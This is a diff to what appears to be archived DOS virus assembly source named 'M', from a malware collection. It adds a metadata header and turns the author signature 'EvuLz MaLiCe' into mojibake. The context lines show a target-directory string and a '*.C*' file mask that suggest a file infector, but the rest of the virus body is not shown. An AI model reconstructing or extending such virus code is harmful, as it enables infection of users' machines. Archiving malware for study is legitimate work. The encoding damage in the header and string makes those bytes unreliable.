@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 
 .model tiny
 .code
@@ -168,7 +179,7 @@ JUST_TO_MAKE_IT_WORSE:
 sec_buf dw 100h dup(?)
 win  db  'C:\windows\command',0
 conn db  '*.C*',0
-who  db  '§ EvuLz MaLiCe §$'   
+who  db  'ï¿½ EvuLz MaLiCe ï¿½$'   
 cntr dw  0
 up_one  db '..',0
 main endp
